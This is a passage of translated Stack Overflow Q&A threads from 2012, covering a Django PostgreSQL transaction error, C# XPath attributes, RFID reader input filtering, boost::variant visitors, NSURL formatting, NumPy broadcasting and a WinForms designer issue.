2012-10-18T04:57:27+00:00 app[web.1]: IntegrityError duplicate key value violates unique constraint "db_activity_company_id_1276b66f55cae366_uniq"
2012-10-18T04:57:27+00:00 app[web.1]: DETAIL:  Key (company_id, opportunity_id)=(10, 39) already exists.
2012-10-18T04:57:27+00:00 app[web.1]: DatabaseError current transaction is aborted, commands ignored until end of transaction block 
```

顺便说一句：我在 MySql 中尝试过完全相同的方法，并且效果很好。

所以，我不知道为什么“get”方法会产生错误。我猜这可能与之前提出的 IntegrateError 有关，但我还没有弄清楚如何避免它。

任何帮助表示赞赏。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T13:03:22.690

我不明白这里的逻辑。在这一行查看您的代码

```
 if(not self.pk):
    try:
        self = Activity.objects.get(company_id=self.company.id,opportunity_id=self.opportunity.id)
    except ObjectDoesNotExist, e:
        pass
    except DatabaseError, e:
        logger.error('DatabaseError %s' % e.message) 
```

你是说：如果当前对象（self）在数据库中不存在。取一个现有的并分配给它。这不是 self 的工作方式。

您应该首先检查该记录是否存在于数据库中。如果存在，则将其分配给局部变量。如果它不存在，则保存它，然后将其添加到同一个局部变量中。

```
def save(self, *args, **kwargs):

    try:
        saveResult = Activity.objects.get(company_id=self.company.id,opportunity_id=self.opportunity.id)
    except ObjectDoesNotExist, e:
        #Object does not exist. Add it
        saveResult = super(Activity, self).save(*args, **kwargs)

    if not saveResult.notified:
        send_notification(...)
        saveResult.notified = 1
        saveResult.save()

    return saveResult 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T21:59:08.413

Have you tried to manage the transaction yourself ? (see below for an example) It looks like the whole save method is wrapped within a single transaction so that the first query after a query which raised an error will always raise an exception.

```
def save(self, *args, **kwargs):
    with transaction.commit_manually:
        saveResult = None
        sid = transaction.savepoint()
        try: 
            saveResult = super(Activity, self).save(*args, **kwargs)
            transaction.savepoint_commit(sid)
        except IntegrityError, e:
            logger.error('IntegrityError %s' % e.message)
            transaction.savepoint_rollback(sid)
        transaction.commit()

    if(not self.pk):
        try:
            self = Activity.objects.get(company_id=self.company.id,opportunity_id=self.opportunity.id)
        except ObjectDoesNotExist, e:
            pass
        except DatabaseError, e:
            logger.error('DatabaseError %s' % e.message)

    if(self.pk and not self.notified):
        send_notification(...)
        self.notified = 1
        self.save()

    return saveResult 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:42:40.057

捕获 DB 错误，然后在没有发生任何事情的情况下继续对我来说看起来很奇怪。

```
current transaction is aborted, commands ignored until end of transaction block 
```

如果您想在 postgres 中出现此类错误后继续，则需要使用保存点。

也许`Activity.objects.get_or_create(..., defaults=dict(attr=value))`你需要的一切。

# c# - 将 XAttribute 添加到 XElement 时出现重复错误

> ID：12954846
> 
> 赞同：1
> 
> 时间：2012-10-18T12:37:08.060
> 
> 标签：c#, xml, xpath

我有一个大的 xml 文件，我正在解析一个 xpath 以在其中插入值。这是我在其中插入一些值的 xml 文件的一部分：

```
<SERVICES>
    <RELATIONSHIPS>
         <RELATIONSHIP xlink:from="fromValue01" xlink:to="toValue01" />
         <RELATIONSHIP xlink:from="fromValue02" xlink:to="toValue02" />
         <RELATIONSHIP xlink:from="fromValue03" xlink:to="toValue03" />
         <RELATIONSHIP xlink:from="fromValue04" xlink:to="toValue04" />
         <RELATIONSHIP xlink:from="fromValue05" xlink:to="toValue05" />
         <RELATIONSHIP xlink:from="fromValue06" xlink:to="toValue06" />
         <RELATIONSHIP xlink:from="fromValue07" xlink:to="toValue07" />
    </RELATIONSHIPS>
<SERVICES> 
```

现在，当我想添加更多`RELATIONSHIP`具有相同属性但具有不同值（例如`<RELATIONSHIP xlink:from="fromValue08" xlink:to="toValue08" />`）的节点时，我总是会`Duplicate Attribute`出错。这将是我正在解析的 xpath 的示例：

```
/SERVICES/RELATIONSHIPS/RELATIONSHIP[@xlink:from="fromValue08" and @xlink:to="toValue08"] 
```

解析器的代码太大，无法粘贴到这里，我确信它工作正常，因为它可以很好地插入所有节点，只有这里的这一部分给我带来了一些麻烦。我还用 Altova 检查了 xpath，它工作正常。

我的问题是：是否在 XML 中添加具有相同属性但具有不同值的节点？如果是，为什么 Visual Studio 总是抛出这个错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T13:13:47.150

我似乎已经想通了。解析器上的问题不如 xpath 上的问题大。我错过了 xpath 上的索引。所以我的解析器选择了第一个`RELATIONSHIP`，它确实有重复的 XAttributes。我只是在属性条件之前添加了索引。所以最后它看起来像：

```
/SERVICES/RELATIONSHIPS/RELATIONSHIP[8][@xlink:from="fromValue08" and @xlink:to="toValue08"] 
```

我不知道这是否是正确的 xpath 语法，以及索引是否应该出现在条件之后，但对于我的解析器来说它正在工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:40:05.920

肯定与您的 XPath 请求有关，可能缺少一个索引`RELATIONSHIPS`

# c++ - 仅允许来自 RFID 阅读器 C++ 的输入

> ID：12954850
> 
> 赞同：2
> 
> 时间：2012-10-18T12:37:20.227
> 
> 标签：c++, security, usb, rfid

是的，我还没有编写任何代码，但这是我的计划：

1.  用户扫描带有唯一 ID 的 RFID 卡
2.  ID 像键盘输入一样读取
3.  ID 与 DB/平面文件相关，并检索相关信息

现在这相当容易，我可以做到这一点，我只是想知道如何防止从我的键盘读取任何其他输入，而不仅仅是从连接了 RFID 读取器（键盘楔形）的 USB 端口读取。

任何帮助将不胜感激。

谢谢，

缺口

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T13:08:14.207

您可以使用[RawInput](http://msdn.microsoft.com/en-us/library/windows/desktop/ms645536%28v=vs.85%29.aspx)来区分来自多个设备的输入。它允许检索设备 VendorID 和 ProductID，这对于不同的设备是唯一的，但对于相同的设备（例如两个相同的键盘）来说，它是相同的，尽管它还提供设备 GUID（在系统中，它对于我理解的系统是唯一的或类似的东西这）和其他一些数据，即使是来自两个相同的设备也有助于区分输入。

您可以检索 RFID 扫描仪的 VID 和 PID 并将所有输入消息与它进行比较，仅从您的设备中捕获符号。

另外，我想您的 RFID 扫描仪输入数据的速度非常快，因此您只需测量用于输入整个符号笔划的时间，并将 RFID 扫描仪与键盘区分开来，而无需知道它的 VID 和 PID 对。

要删除不需要的输入，您可以使用窗口挂钩。

差点忘了，微软为 POS 设备开发了一些框架，但它是针对 .NET 的，它被称为[POS for .NET](http://msdn.microsoft.com/en-us/library/ms828083(v=winembedded.10).aspx)。也许它会有所帮助，就我而言，我无法使用它。

PS：我目前正在自己​​解决这个难题，但是使用条形码扫描仪（[在不知道 VID&PID 的情况下读取条形码扫描仪输入](https://stackoverflow.com/questions/12497105/reading-usb-hid-barcode-scanner-input-without-knowing-vidpid)）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-09T14:27:38.977

我们在我工作的公司的 RFID 阅读器上也遇到了同样的问题，我们为它建立了一个库来获取 rfid 卡 ID。现在该库已开源（LGPL 许可），我相信它可以被视为您问题的答案。它使用 Ivan0x32 建议的 RawInput 并在当前活动控制台上启动钩子进程并在需要时进行模拟（因为会话 0 隔离，以防您正在开发 Windows 服务）。转到[LibLogicalAccess](http://liblogicalaccess.islog.com/)项目并寻找“键盘”阅读器。

# c++ - 具有多个参数的 boost::static_visitor

> ID：12954852
> 
> 赞同：12
> 
> 时间：2012-10-18T12:37:23.507
> 
> 标签：c++, boost, boost-variant

```
typedef boost::variant<int, double> Type;
class Append: public boost::static_visitor<>
{
public:
    void operator()(int)
    {}

    void operator()(double)
    {}

};

Type type(1.2);
Visitor visitor;
boost::apply_visitor(visitor, type); 
```

是否可以更改访问者以使其接收额外数据，如下所示：

```
class Append: public boost::static_visitor<>
{
public:
    void operator()(int, const std::string&)
    {}

    void operator()(double, const std::string&)
    {}
}; 
```

此字符串值在 Append 对象的生命周期内发生变化。在这种情况下，通过构造函数传入字符串不是一种选择。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-10-18T12:49:37.093

给每个调用的“附加参数”是`this`指针。使用它来传递您需要的任何其他信息：

```
#include <boost/variant.hpp>
typedef boost::variant<int, double> Type;
class Append: public boost::static_visitor<>
{
public:
    void operator()(int)
    {}

    void operator()(double)
    {}
    std::string argument;
};

int main() {
    Type type(1.2);
    Append visitor;
    visitor.argument = "first value";
    boost::apply_visitor(visitor, type);
    visitor.argument = "new value";
    boost::apply_visitor(visitor, type);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-11-16T18:31:57.363

另一种选择是绑定额外的参数。您的访问者类可能如下所示：

```
class Append: public boost::static_visitor<>
{
public:
    void operator()(const std::string&, int)
    {}

    void operator()(const std::string&, double)
    {}
}; 
```

像这样称呼它：

```
std::string myString = "foo";
double value = 1.2;
auto visitor = std::bind( Append(), myString, std::placeholders::_1 );
boost::apply_visitor( visitor, value ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-06-08T16:16:33.490

这个解决了你的问题：

```
#include <iostream>
#include <string>
#include <boost/variant.hpp>

typedef boost::variant<int, double> Type;
typedef boost::variant<const std::string> Extra;
class Append: public boost::static_visitor<>
{
public:
    void operator()(const int& a1, const std::string& a2) const {
        std::cout << "arg 1 = "<< a1 << "\n";
        std::cout << "arg 2 = "<< a2 << "\n";
    }

    void operator()(const double& a1, const std::string& a2) const {
        std::cout << "arg 1 = "<< a1 << "\n";
        std::cout << "arg 2 = "<< a2 << "\n";
    }
};

int main()
{
    Type type(1.2);
    Extra str("extra argument");
    boost::apply_visitor(Append(), type, str);
} 
```

这是一个工作`[Demo](http://coliru.stacked-crooked.com/a/8d53a98fed41d5fa)`。您可以发送额外的参数 - 任意数量。限制是它们必须被包裹在 boost::variant 中。但是，编译器会优化内部具有单一类型的变体。如果您需要两个以上的参数`#include <boost/variant/multivisitors.hpp>`，请参阅[https://www.boost.org/doc/libs/1_70_0/doc/html/boost/apply_visitor.html](https://www.boost.org/doc/libs/1_70_0/doc/html/boost/apply_visitor.html)

# php - iOS Xcode NSURL 参数太多

> ID：12954866
> 
> 赞同：4
> 
> 时间：2012-10-18T12:38:10.383
> 
> 标签：php, objective-c, ios, xcode, nsurl

在我的代码中，我试图将一些数据发送到我的 PHP 文件

为了将东西添加到我的 SQL 中，我使用 GET 方法。

到目前为止，我需要在网站上使用表单，但我想通过浏览来添加数据，例如：

[http://server.com/add.php?user=some](http://server.com/add.php?user=some) data here&message= last data here

到目前为止，我正在尝试使用此代码：

```
 NSURL *add = [NSURL URLWithString:@"http://server.com/ios/add.php?user=iPhone App&message=%@",
                                 messageBox.text]; 

 [messageView loadRequest:[NSURLRequest requestWithURL:add]]; 
```

然而 Xcode 告诉我：“方法调用的参数太多，预期 1，有 2”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:41:49.603

试试这个

```
NSString *urlString = @"http://server.com/ios/add.php?user=iPhone App&message=";
NSString *escapedString = [urlString stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
NSURL *add = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@",escapedString, messageBox.text]];
[messageView loadRequest:[NSURLRequest requestWithURL:add]]; 
```

你应该使用`NSString +stringWithFormat:`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:43:51.510

URLWithString 接受字符串或字符串文字。你应该这样做：

```
NSString* urlString = [NSString stringWithFormat:@"http://server.com/ios/add.php?user=iPhone App&message=%@", messageBox.text];
NSURL *add = [NSURL URLWithString:urlString];  
[messageView loadRequest:[NSURLRequest requestWithURL:add]]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:44:27.280

```
NSURL *add = [NSURL URLWithString:[NSString stringWithFormat:@"http://server.com/ios/add.php?user=iPhone App&message=%@", messageBox.text]]; 
```

这是因为 URLWithString: 只需要一个 NSString * 类型的参数。使用 NSString 的 +stringWithFormat: 方法从格式化的字符串和参数创建一个 NSString 对象。

# python - 从列表中构造点的 3D 立方体

> ID：12954867
> 
> 赞同：1
> 
> 时间：2012-10-18T12:38:13.240
> 
> 标签：python, numpy

我有一个`pts`包含`N`点的列表（Python 浮点数）。我希望构造一个 NumPy 维度数组，`N*N*N*3`使得该数组等效于：

```
for i in xrange(0, N):
    for j in xrange(0, N):
        for k in xrange(0, N):
            arr[i,j,k,0] = pts[i]
            arr[i,j,k,1] = pts[j]
            arr[i,j,k,2] = pts[k] 
```

我想知道如何利用 NumPy 的数组广播规则和函数`tile`来简化这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:46:37.513

我认为以下应该有效：

```
pts = np.array(pts)  #Skip if pts is a numpy array already
lp = len(pts)
arr = np.zeros((lp,lp,lp,3))
arr[:,:,:,0] = pts[:,None,None]  #None is the same as np.newaxis
arr[:,:,:,1] = pts[None,:,None]
arr[:,:,:,2] = pts[None,None,:] 
```

快速测试：

```
import numpy as np
import timeit

def meth1(pts):
   pts = np.array(pts)  #Skip if pts is a numpy array already
   lp = len(pts)
   arr = np.zeros((lp,lp,lp,3))
   arr[:,:,:,0] = pts[:,None,None]  #None is the same as np.newaxis
   arr[:,:,:,1] = pts[None,:,None]
   arr[:,:,:,2] = pts[None,None,:]
   return arr

def meth2(pts):
   lp = len(pts)
   N = lp
   arr = np.zeros((lp,lp,lp,3))
   for i in xrange(0, N):
      for j in xrange(0, N):
         for k in xrange(0, N):
            arr[i,j,k,0] = pts[i]
            arr[i,j,k,1] = pts[j]
            arr[i,j,k,2] = pts[k]

   return arr

pts = range(10)
a1 = meth1(pts)
a2 = meth2(pts)

print np.all(a1 == a2)

NREPEAT = 10000
print timeit.timeit('meth1(pts)','from __main__ import meth1,pts',number=NREPEAT)
print timeit.timeit('meth2(pts)','from __main__ import meth2,pts',number=NREPEAT) 
```

结果是：

```
True
0.873255968094   #my way
11.4249279499    #original 
```

所以这种新方法也快了一个数量级。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:48:59.853

```
import numpy as np
N = 10
pts = xrange(0,N)
l = [ [ [ [ pts[i],pts[j],pts[k] ]  for k in xrange(0,N) ] for j in xrange(0,N) ] for i in xrange(0,N) ]
x = np.array(l, np.int32)
print x.shape # (10,10,10,3) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T15:21:30.510

这可以通过两行来完成：

```
def meth3(pts):
    arrs = np.broadcast_arrays(*np.ix_(pts, pts, pts))
    return np.concatenate([a[...,None] for a in arrs], axis=3) 
```

但是，这种方法不如[mgilson](https://stackoverflow.com/a/12955035/577088)的答案快，因为`concatenate`速度慢得令人讨厌。不过，他的答案的广义版本的性能也大致相同，并且可以为任何数组集生成您想要的结果（即包含在 n 维网格中的 n 维笛卡尔积）。

```
def meth4(arrs):     # or meth4(*arrs) for a simplified interface
    arr = np.empty([len(a) for a in arrs] + [len(arrs)])
    for i, a in enumerate(np.ix_(*arrs)):
        arr[...,i] = a
    return arr 
```

这接受任何序列序列，只要它可以转换为 numpy 数组序列：

```
>>> meth4([[0, 1], [2, 3]])
array([[[ 0.,  2.],
        [ 0.,  3.]],

       [[ 1.,  2.],
        [ 1.,  3.]]]) 
```

而且这种通用性的成本并不太高——对于小型`pts`阵列来说，它的速度只有两倍：

```
>>> (meth4([pts, pts, pts]) == meth1(pts)).all()
True
>>> %timeit meth4([pts, pts, pts])
10000 loops, best of 3: 27.4 us per loop
>>> %timeit meth1(pts)
100000 loops, best of 3: 13.1 us per loop 
```

而且对于较大的，它实际上要快一些（尽管速度增益可能是由于我使用了`empty`而不是`zeros`）：

```
>>> pts = np.linspace(0, 1, 100)
>>> %timeit meth4([pts, pts, pts])
100 loops, best of 3: 13.4 ms per loop
>>> %timeit meth1(pts)
100 loops, best of 3: 16.7 ms per loop 
```

# .net - 在设计期间未在表单上绘制控件

> ID：12954868
> 
> 赞同：0
> 
> 时间：2012-10-18T12:38:16.793
> 
> 标签：.net, vb.net, windows-forms-designer

我做得很好，然后当我试图更改我的控件的名称时，标签页上的所有控件都消失了。设计文件中的代码仍然存在，我可以在属性窗口中看到所有控件，但如果我选择一个，则没有任何反应。如果我尝试在它出现的表单上放置一个新控件。有趣的是，当我尝试在窗体上放置一个新控件时，我看到所有试图将新控件与现有控件对齐的蓝色和粉色线条

这是设计器代码

```
<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmTaxInvoiceRegister
Inherits System.Windows.Forms.Form

'Form overrides dispose to clean up the component list.
<System.Diagnostics.DebuggerNonUserCode()> _
Protected Overrides Sub Dispose(ByVal disposing As Boolean)
    If disposing AndAlso components IsNot Nothing Then
        components.Dispose()
    End If
    MyBase.Dispose(disposing)
End Sub

'Required by the Windows Form Designer
Private components As System.ComponentModel.IContainer

'NOTE: The following procedure is required by the Windows Form Designer
'It can be modified using the Windows Form Designer.  
'Do not modify it using the code editor.
<System.Diagnostics.DebuggerStepThrough()> _
Private Sub InitializeComponent()
    Me.components = New System.ComponentModel.Container()
    Me.epValidator = New System.Windows.Forms.ErrorProvider(Me.components)
    Me.tclTaxInvoiceRegister = New Common.CustomControls.TabControlDAI()
    Me.tpgTaxInvoiceRegister = New Common.CustomControls.TabPageDAI()
    Me.lblEndDate = New System.Windows.Forms.Label()
    Me.lblStartDate = New System.Windows.Forms.Label()
    Me.dtpEndDate = New System.Windows.Forms.DateTimePicker()
    Me.dtpStartDate = New System.Windows.Forms.DateTimePicker()
    Me.btnRunReport = New System.Windows.Forms.Button()
    Me.grpTaxAddress = New System.Windows.Forms.GroupBox()
    Me.lblTaxAddress2 = New System.Windows.Forms.Label()
    Me.lblTaxAddress3 = New System.Windows.Forms.Label()
    Me.ReadOnlyTextBox5 = New Common.CustomControls.ReadOnlyTextBox()
    Me.lblTaxAddress1 = New System.Windows.Forms.Label()
    Me.ReadOnlyTextBox3 = New Common.CustomControls.ReadOnlyTextBox()
    Me.ReadOnlyTextBox4 = New Common.CustomControls.ReadOnlyTextBox()
    Me.lblTaxId = New System.Windows.Forms.Label()
    Me.lblOwnerName = New System.Windows.Forms.Label()
    Me.lblReportType = New System.Windows.Forms.Label()
    Me.ReadOnlyTextBox2 = New Common.CustomControls.ReadOnlyTextBox()
    Me.ReadOnlyTextBox1 = New Common.CustomControls.ReadOnlyTextBox()
    Me.cboReportType = New Common.CustomControls.ReadOnlyComboBox()
    CType(Me.epValidator, System.ComponentModel.ISupportInitialize).BeginInit()
    Me.tclTaxInvoiceRegister.SuspendLayout()
    Me.grpTaxAddress.SuspendLayout()
    Me.SuspendLayout()
    '
    'epValidator
    '
    Me.epValidator.ContainerControl = Me
    '
    'tclTaxInvoiceRegister
    '
    Me.tclTaxInvoiceRegister.AllowPageInsert = False
    Me.tclTaxInvoiceRegister.AllowPageReplace = False
    Me.tclTaxInvoiceRegister.Controls.Add(Me.tpgTaxInvoiceRegister)
    Me.tclTaxInvoiceRegister.Location = New System.Drawing.Point(2, 2)
    Me.tclTaxInvoiceRegister.Name = "tclTaxInvoiceRegister"
    Me.tclTaxInvoiceRegister.SelectedIndex = 0
    Me.tclTaxInvoiceRegister.Size = New System.Drawing.Size(398, 360)
    Me.tclTaxInvoiceRegister.TabIndex = 0
    Me.tclTaxInvoiceRegister.ValidationResult = System.Windows.Forms.DialogResult.None
    '
    'tpgTaxInvoiceRegister
    '
    Me.tpgTaxInvoiceRegister.BackColor = System.Drawing.SystemColors.Control
    Me.tpgTaxInvoiceRegister.IgnoreValidation = False
    Me.tpgTaxInvoiceRegister.Location = New System.Drawing.Point(4, 22)
    Me.tpgTaxInvoiceRegister.Name = "tpgTaxInvoiceRegister"
    Me.tpgTaxInvoiceRegister.Padding = New System.Windows.Forms.Padding(3)
    Me.tpgTaxInvoiceRegister.Size = New System.Drawing.Size(390, 334)
    Me.tpgTaxInvoiceRegister.TabIndex = 1017
    Me.tpgTaxInvoiceRegister.Text = "Tax Invoice Creation"
    '
    'lblEndDate
    '
    Me.lblEndDate.AutoSize = True
    Me.lblEndDate.Location = New System.Drawing.Point(235, 101)
    Me.lblEndDate.Name = "lblEndDate"
    Me.lblEndDate.Size = New System.Drawing.Size(55, 13)
    Me.lblEndDate.TabIndex = 17
    Me.lblEndDate.Text = "End Date:"
    '
    'lblStartDate
    '
    Me.lblStartDate.AutoSize = True
    Me.lblStartDate.Location = New System.Drawing.Point(13, 101)
    Me.lblStartDate.Name = "lblStartDate"
    Me.lblStartDate.Size = New System.Drawing.Size(58, 13)
    Me.lblStartDate.TabIndex = 16
    Me.lblStartDate.Text = "Start Date:"
    '
    'dtpEndDate
    '
    Me.dtpEndDate.CustomFormat = "MMM-yyyy"
    Me.dtpEndDate.Format = System.Windows.Forms.DateTimePickerFormat.Custom
    Me.dtpEndDate.Location = New System.Drawing.Point(296, 97)
    Me.dtpEndDate.Name = "dtpEndDate"
    Me.dtpEndDate.Size = New System.Drawing.Size(73, 20)
    Me.dtpEndDate.TabIndex = 15
    Me.dtpEndDate.Value = New Date(2012, 10, 17, 0, 0, 0, 0)
    '
    'dtpStartDate
    '
    Me.dtpStartDate.CustomFormat = "MMM-yyyy"
    Me.dtpStartDate.Format = System.Windows.Forms.DateTimePickerFormat.Custom
    Me.dtpStartDate.Location = New System.Drawing.Point(77, 97)
    Me.dtpStartDate.Name = "dtpStartDate"
    Me.dtpStartDate.Size = New System.Drawing.Size(73, 20)
    Me.dtpStartDate.TabIndex = 14
    Me.dtpStartDate.Value = New Date(2012, 10, 17, 0, 0, 0, 0)
    '
    'btnRunReport
    '
    Me.btnRunReport.Location = New System.Drawing.Point(147, 294)
    Me.btnRunReport.Name = "btnRunReport"
    Me.btnRunReport.Size = New System.Drawing.Size(97, 23)
    Me.btnRunReport.TabIndex = 13
    Me.btnRunReport.Text = "Create Tax File"
    Me.btnRunReport.UseVisualStyleBackColor = True
    '
    'grpTaxAddress
    '
    Me.grpTaxAddress.Controls.Add(Me.lblTaxAddress2)
    Me.grpTaxAddress.Controls.Add(Me.lblTaxAddress3)
    Me.grpTaxAddress.Controls.Add(Me.ReadOnlyTextBox5)
    Me.grpTaxAddress.Controls.Add(Me.lblTaxAddress1)
    Me.grpTaxAddress.Controls.Add(Me.ReadOnlyTextBox3)
    Me.grpTaxAddress.Controls.Add(Me.ReadOnlyTextBox4)
    Me.grpTaxAddress.Location = New System.Drawing.Point(6, 179)
    Me.grpTaxAddress.Name = "grpTaxAddress"
    Me.grpTaxAddress.Size = New System.Drawing.Size(379, 109)
    Me.grpTaxAddress.TabIndex = 11
    Me.grpTaxAddress.TabStop = False
    Me.grpTaxAddress.Text = "Tax Address"
    '
    'lblTaxAddress2
    '
    Me.lblTaxAddress2.AutoSize = True
    Me.lblTaxAddress2.Location = New System.Drawing.Point(6, 55)
    Me.lblTaxAddress2.Name = "lblTaxAddress2"
    Me.lblTaxAddress2.Size = New System.Drawing.Size(39, 13)
    Me.lblTaxAddress2.TabIndex = 12
    Me.lblTaxAddress2.Text = "Line 2:"
    '
    'lblTaxAddress3
    '
    Me.lblTaxAddress3.AutoSize = True
    Me.lblTaxAddress3.Location = New System.Drawing.Point(6, 82)
    Me.lblTaxAddress3.Name = "lblTaxAddress3"
    Me.lblTaxAddress3.Size = New System.Drawing.Size(39, 13)
    Me.lblTaxAddress3.TabIndex = 11
    Me.lblTaxAddress3.Text = "Line 3:"
    '
    'ReadOnlyTextBox5
    '
    Me.ReadOnlyTextBox5.Location = New System.Drawing.Point(51, 79)
    Me.ReadOnlyTextBox5.Name = "ReadOnlyTextBox5"
    Me.ReadOnlyTextBox5.Size = New System.Drawing.Size(312, 20)
    Me.ReadOnlyTextBox5.TabIndex = 5
    '
    'lblTaxAddress1
    '
    Me.lblTaxAddress1.AutoSize = True
    Me.lblTaxAddress1.Location = New System.Drawing.Point(6, 28)
    Me.lblTaxAddress1.Name = "lblTaxAddress1"
    Me.lblTaxAddress1.Size = New System.Drawing.Size(39, 13)
    Me.lblTaxAddress1.TabIndex = 10
    Me.lblTaxAddress1.Text = "Line 1:"
    '
    'ReadOnlyTextBox3
    '
    Me.ReadOnlyTextBox3.Location = New System.Drawing.Point(51, 25)
    Me.ReadOnlyTextBox3.Name = "ReadOnlyTextBox3"
    Me.ReadOnlyTextBox3.Size = New System.Drawing.Size(312, 20)
    Me.ReadOnlyTextBox3.TabIndex = 3
    '
    'ReadOnlyTextBox4
    '
    Me.ReadOnlyTextBox4.Location = New System.Drawing.Point(51, 52)
    Me.ReadOnlyTextBox4.Name = "ReadOnlyTextBox4"
    Me.ReadOnlyTextBox4.Size = New System.Drawing.Size(312, 20)
    Me.ReadOnlyTextBox4.TabIndex = 4
    '
    'lblTaxId
    '
    Me.lblTaxId.AutoSize = True
    Me.lblTaxId.Location = New System.Drawing.Point(3, 156)
    Me.lblTaxId.Name = "lblTaxId"
    Me.lblTaxId.Size = New System.Drawing.Size(40, 13)
    Me.lblTaxId.TabIndex = 8
    Me.lblTaxId.Text = "Tax Id:"
    '
    'lblOwnerName
    '
    Me.lblOwnerName.AutoSize = True
    Me.lblOwnerName.Location = New System.Drawing.Point(3, 130)
    Me.lblOwnerName.Name = "lblOwnerName"
    Me.lblOwnerName.Size = New System.Drawing.Size(127, 13)
    Me.lblOwnerName.TabIndex = 7
    Me.lblOwnerName.Text = "Company / Owner Name:"
    '
    'lblReportType
    '
    Me.lblReportType.AutoSize = True
    Me.lblReportType.Location = New System.Drawing.Point(3, 32)
    Me.lblReportType.Name = "lblReportType"
    Me.lblReportType.Size = New System.Drawing.Size(66, 13)
    Me.lblReportType.TabIndex = 6
    Me.lblReportType.Text = "Report Type"
    '
    'ReadOnlyTextBox2
    '
    Me.ReadOnlyTextBox2.Location = New System.Drawing.Point(133, 153)
    Me.ReadOnlyTextBox2.Name = "ReadOnlyTextBox2"
    Me.ReadOnlyTextBox2.Size = New System.Drawing.Size(100, 20)
    Me.ReadOnlyTextBox2.TabIndex = 2
    '
    'ReadOnlyTextBox1
    '
    Me.ReadOnlyTextBox1.Location = New System.Drawing.Point(133, 127)
    Me.ReadOnlyTextBox1.Name = "ReadOnlyTextBox1"
    Me.ReadOnlyTextBox1.Size = New System.Drawing.Size(236, 20)
    Me.ReadOnlyTextBox1.TabIndex = 1
    '
    'cboReportType
    '
    Me.cboReportType.FormattingEnabled = True
    Me.cboReportType.Location = New System.Drawing.Point(75, 29)
    Me.cboReportType.Name = "cboReportType"
    Me.cboReportType.Size = New System.Drawing.Size(294, 21)
    Me.cboReportType.TabIndex = 18
    '
    'frmTaxInvoiceRegister
    '
    Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
    Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
    Me.ClientSize = New System.Drawing.Size(404, 371)
    Me.Controls.Add(Me.tclTaxInvoiceRegister)
    Me.Name = "frmTaxInvoiceRegister"
    Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
    Me.Text = "Tax Invoice Register"
    CType(Me.epValidator, System.ComponentModel.ISupportInitialize).EndInit()
    Me.tclTaxInvoiceRegister.ResumeLayout(False)
    Me.grpTaxAddress.ResumeLayout(False)
    Me.grpTaxAddress.PerformLayout()
    Me.ResumeLayout(False)

End Sub
Friend WithEvents epValidator As System.Windows.Forms.ErrorProvider
Friend WithEvents tclTaxInvoiceRegister As Common.CustomControls.TabControlDAI
Friend WithEvents tpgTaxInvoiceRegister As Common.CustomControls.TabPageDAI
Friend WithEvents lblTaxId As System.Windows.Forms.Label
Friend WithEvents lblOwnerName As System.Windows.Forms.Label
Friend WithEvents lblReportType As System.Windows.Forms.Label
Friend WithEvents ReadOnlyTextBox5 As Common.CustomControls.ReadOnlyTextBox
Friend WithEvents ReadOnlyTextBox4 As Common.CustomControls.ReadOnlyTextBox
Friend WithEvents ReadOnlyTextBox3 As Common.CustomControls.ReadOnlyTextBox
Friend WithEvents ReadOnlyTextBox2 As Common.CustomControls.ReadOnlyTextBox
Friend WithEvents ReadOnlyTextBox1 As Common.CustomControls.ReadOnlyTextBox
Friend WithEvents grpTaxAddress As System.Windows.Forms.GroupBox
Friend WithEvents lblTaxAddress2 As System.Windows.Forms.Label
Friend WithEvents lblTaxAddress3 As System.Windows.Forms.Label
Friend WithEvents lblTaxAddress1 As System.Windows.Forms.Label
Friend WithEvents ctlRestaurantSelector As Common.BusinessControls.Subway.RestaurantSelector
Friend WithEvents btnRunReport As System.Windows.Forms.Button
Friend WithEvents dtpStartDate As System.Windows.Forms.DateTimePicker
Friend WithEvents lblEndDate As System.Windows.Forms.Label
Friend WithEvents lblStartDate As System.Windows.Forms.Label
Friend WithEvents dtpEndDate As System.Windows.Forms.DateTimePicker
Friend WithEvents cboReportType As Common.CustomControls.ReadOnlyComboBox
End Class 
```

这是我看到的

![跆拳道](../Images/59dbb90c403f835508b90380ab798e8a.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:45:24.077

VS 表单设计者正在尝试做一些相当困难的事情（安全地执行部分编写的程序的一部分），但他们并不总是能成功。（我在这里对VS保持礼貌......）

当这样的事情出错时，最好的办法是关闭所有设计器窗口和任何其他打开相同表单类的源代码的窗口，然后重新构建完整的应用程序，然后再次尝试进入设计器。如果这不起作用，则可能需要重新启动 VS。

如果您创建了在表单生命周期的早期抛出异常的情况（例如，来自构造函数），那么 VS 真的很难解决这个问题。

VS 的每个版本都试图对此进行改进，但是虽然我看到失败的外观发生了变化，但我从来没有看到太多的净改进......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T13:32:40.963

缺少将控件实际添加到标签页容器的代码

```
 Me.tpgTaxInvoiceRegister.Controls.Add(Me.ctlRestaurantSelector)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.lblTaxId)
